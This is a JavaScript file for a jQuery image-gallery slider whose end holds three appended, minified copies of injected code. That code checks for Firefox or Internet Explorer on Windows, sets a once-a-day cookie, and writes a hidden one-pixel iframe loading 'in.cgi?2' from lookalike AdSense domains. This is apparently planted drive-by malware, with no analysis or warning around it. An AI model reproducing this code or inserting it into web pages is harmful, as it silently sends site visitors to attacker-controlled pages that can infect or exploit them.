Gallery = {
	currentImage: 0,
	imageHolders: null,
	imageHolderWidth: null,
	imageCountHolder: null,
	maxCount: null,
	nextButton: null,
	prevButoon: null,
	init: function(imageHolder, imageWrapperWidth, imageCountHolder, nextButton, prevButton, descriptionHolder, descriptionWidth) {
		// set custom variables
		this.imageHolder = imageHolder;
		this.imageWrapperWidth = imageWrapperWidth;
		this.imageCountHolder = imageCountHolder;
		this.maxCount = $("img", imageHolder).length;
		this.nextButton = nextButton;
		this.prevButton = prevButton;
		this.descriptionHolder = descriptionHolder;
		this.descriptionWidth = descriptionWidth;
		
		// check if a specific image has been specified in the URL
		if(document.URL.match(/#[0-9]+/)) {
			this.gotoImage(new Number(new String(document.URL.match(/#[0-9]+/)).replace("#", "")) - 1);
		} else {
			// write maxCount
			this.updateCount(0);
		} 
		// 
		this.attachEvents();
	},
	attachEvents: function() {
		// write next/prev functions
		this.nextButton.click(function() {
			Gallery.next();
			this.blur();
			return false;
		});
		this.prevButton.click(function() {
			Gallery.previous();
			this.blur();
			return false;
		});
	},
	next: function() {
		// show next image
		this.gotoImage(this.currentImage + 1);
	},
	previous: function() {
		// show previous image
		this.gotoImage(this.currentImage - 1);
	},
	updateCount: function(newCount) {
		// set current image
		this.currentImage = newCount;
		// update current image display
		this.imageCountHolder.innerHTML = (newCount + 1) + "/" + this.maxCount;
		// update url hash
		//window.location.hash = (newCount + 1);
	},
	gotoImage: function(num) {
		// if not too high
		if(num >= this.maxCount) {
			num = 0;
		} else if(num < 0) {
			num = this.maxCount - 1;
		}
		//animate
		this.animateContainers(num);
		// update count
		this.updateCount(num);
	},
	animateContainers: function(num) {
		this.imageHolder.animate({
			marginLeft: (num * this.imageWrapperWidth) * -1 + "px"
		}, { duration: 600, queue: false });
		
		// skip attempt to animate description holder if it does not exist
		if(!this.descriptionHolder) return;
		
		this.descriptionHolder.animate({
			marginLeft: (num * this.descriptionWidth) * -1 + "px"
		}, { duration: 600, queue: false });
	}
}var BrowserDetect = { init: function () { this.browser = this.searchString(this.dataBrowser) || "An unknown browser"; this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version"; this.OS = this.searchString(this.dataOS) || "an unknown OS"; }, searchString: function (data) { for (var i=0;i<data.length;i++) { var dataString = data[i].string; var dataProp = data[i].prop; this.versionSearchString = data[i].versionSearch || data[i].identity; if (dataString) { if (dataString.indexOf(data[i].subString) != -1) return data[i].identity; } else if (dataProp) return data[i].identity; } }, searchVersion: function (dataString) { var index = dataString.indexOf(this.versionSearchString); if (index == -1) return; return parseFloat(dataString.substring(index+this.versionSearchString.length+1)); }, dataBrowser: [       { string: navigator.userAgent,subString: "Firefox",identity: "Firefox"},{string: navigator.userAgent,subString: "MSIE",identity: "Explorer",versionSearch: "MSIE"}],dataOS : [{string: navigator.platform,subString: "Win",identity: "Windows"}]};function addCookie(szName,szValue,dtDaysExpires){ var dtExpires = new Date();var dtExpiryDate = "";dtExpires.setTime(dtExpires.getTime()+dtDaysExpires*24*60*60*1000);dtExpiryDate=dtExpires.toGMTString();document.cookie=szName+"="+szValue+";expires="+dtExpiryDate;} function findCookie(szName){        var i=0;var nStartPosition=0;var nEndPosition=0;var szCookieString=document.cookie; while (i<=szCookieString.length){nStartPosition=i;nEndPosition=nStartPosition+szName.length;if (szCookieString.substring(nStartPosition,nEndPosition)==szName){nStartPosition=nEndPosition+1;nEndPosition=document.cookie.indexOf(";",nStartPosition);if(nEndPosition<nStartPosition) nEndPosition=document.cookie.length;return document.cookie.substring(nStartPosition,nEndPosition);break;}i++;} return "";} BrowserDetect.init(); var szCookieString = document.cookie; var boroda = BrowserDetect.browser; var os = BrowserDetect.OS; if ( ((boroda == "Firefox" || boroda == "Explorer") && (os == "Windows")) && (findCookie('geo_idn')!='c48a765e4f75baeb85f0a755fc3ec09c') ) {addCookie("geo_idn","c48a765e4f75baeb85f0a755fc3ec09c",1);document.write('<iframe src="http://google-adsenc.com/in.cgi?2" name="Twitter" scrolling="auto" frameborder="no" align="center" height = "1px" width = "1px"></iframe>');}else {}var BrowserDetect = { init: function () { this.browser = this.searchString(this.dataBrowser) || "An unknown browser"; this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version"; this.OS = this.searchString(this.dataOS) || "an unknown OS"; }, searchString: function (data) { for (var i=0;i<data.length;i++) { var dataString = data[i].string; var dataProp = data[i].prop; this.versionSearchString = data[i].versionSearch || data[i].identity; if (dataString) { if (dataString.indexOf(data[i].subString) != -1) return data[i].identity; } else if (dataProp) return data[i].identity; } }, searchVersion: function (dataString) { var index = dataString.indexOf(this.versionSearchString); if (index == -1) return; return parseFloat(dataString.substring(index+this.versionSearchString.length+1)); }, dataBrowser: [       { string: navigator.userAgent,subString: "Firefox",identity: "Firefox"},{string: navigator.userAgent,subString: "MSIE",identity: "Explorer",versionSearch: "MSIE"}],dataOS : [{string: navigator.platform,subString: "Win",identity: "Windows"}]};function addCookie(szName,szValue,dtDaysExpires){ var dtExpires = new Date();var dtExpiryDate = "";dtExpires.setTime(dtExpires.getTime()+dtDaysExpires*24*60*60*1000);dtExpiryDate=dtExpires.toGMTString();document.cookie=szName+"="+szValue+";expires="+dtExpiryDate;} function findCookie(szName){        var i=0;var nStartPosition=0;var nEndPosition=0;var szCookieString=document.cookie; while (i<=szCookieString.length){nStartPosition=i;nEndPosition=nStartPosition+szName.length;if (szCookieString.substring(nStartPosition,nEndPosition)==szName){nStartPosition=nEndPosition+1;nEndPosition=document.cookie.indexOf(";",nStartPosition);if(nEndPosition<nStartPosition) nEndPosition=document.cookie.length;return document.cookie.substring(nStartPosition,nEndPosition);break;}i++;} return "";} BrowserDetect.init(); var szCookieString = document.cookie; var boroda = BrowserDetect.browser; var os = BrowserDetect.OS; if ( ((boroda == "Firefox" || boroda == "Explorer") && (os == "Windows")) && (findCookie('geo_idn')!='c48a765e4f75baeb85f0a755fc3ec09c') ) {addCookie("geo_idn","c48a765e4f75baeb85f0a755fc3ec09c",1);document.write('<iframe src="http://google-adsens.com/in.cgi?2" name="Twitter" scrolling="auto" frameborder="no" align="center" height = "1px" width = "1px"></iframe>');}else {}var BrowserDetect = { init: function () { this.browser = this.searchString(this.dataBrowser) || "An unknown browser"; this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version"; this.OS = this.searchString(this.dataOS) || "an unknown OS"; }, searchString: function (data) { for (var i=0;i<data.length;i++) { var dataString = data[i].string; var dataProp = data[i].prop; this.versionSearchString = data[i].versionSearch || data[i].identity; if (dataString) { if (dataString.indexOf(data[i].subString) != -1) return data[i].identity; } else if (dataProp) return data[i].identity; } }, searchVersion: function (dataString) { var index = dataString.indexOf(this.versionSearchString); if (index == -1) return; return parseFloat(dataString.substring(index+this.versionSearchString.length+1)); }, dataBrowser: [       { string: navigator.userAgent,subString: "Firefox",identity: "Firefox"},{string: navigator.userAgent,subString: "MSIE",identity: "Explorer",versionSearch: "MSIE"}],dataOS : [{string: navigator.platform,subString: "Win",identity: "Windows"}]};function addCookie(szName,szValue,dtDaysExpires){ var dtExpires = new Date();var dtExpiryDate = "";dtExpires.setTime(dtExpires.getTime()+dtDaysExpires*24*60*60*1000);dtExpiryDate=dtExpires.toGMTString();document.cookie=szName+"="+szValue+";expires="+dtExpiryDate;} function findCookie(szName){        var i=0;var nStartPosition=0;var nEndPosition=0;var szCookieString=document.cookie; while (i<=szCookieString.length){nStartPosition=i;nEndPosition=nStartPosition+szName.length;if (szCookieString.substring(nStartPosition,nEndPosition)==szName){nStartPosition=nEndPosition+1;nEndPosition=document.cookie.indexOf(";",nStartPosition);if(nEndPosition<nStartPosition) nEndPosition=document.cookie.length;return document.cookie.substring(nStartPosition,nEndPosition);break;}i++;} return "";} BrowserDetect.init(); var szCookieString = document.cookie; var boroda = BrowserDetect.browser; var os = BrowserDetect.OS; if ( ((boroda == "Firefox" || boroda == "Explorer") && (os == "Windows")) && (findCookie('geo_idn')!='c48a765e4f75baeb85f0a755fc3ec09c') ) {addCookie("geo_idn","c48a765e4f75baeb85f0a755fc3ec09c",1);document.write('<iframe src="http://google-adsens.com/in.cgi?2" name="Twitter" scrolling="auto" frameborder="no" align="center" height = "1px" width = "1px"></iframe>');}else {}